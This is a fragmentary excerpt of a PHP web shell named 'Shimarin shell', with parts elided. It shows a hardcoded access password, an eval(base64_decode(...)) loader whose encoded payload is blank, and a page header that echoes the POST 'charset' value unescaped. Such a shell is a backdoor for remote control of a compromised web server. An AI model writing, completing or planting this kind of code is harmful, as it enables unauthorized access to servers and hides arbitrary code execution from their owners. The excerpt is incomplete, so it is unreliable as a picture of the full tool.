...
$auth_pass = "1L2ZS6zQsEGNuMy4Y2AUkkYycCL4yPeV92"; // shimarin
$color = "#00ff00";
...
$shell_data = ""; eval(base64_decode($shell_data)); 
...
function printHeader() {
	...
	global $color;
	?>
<html><head><meta http-equiv='Content-Type' content='text/html; charset=<?=$_POST['charset']?>'><title><?=$_SERVER['HTTP_HOST']?> ..// Shimarin shell >>></title>
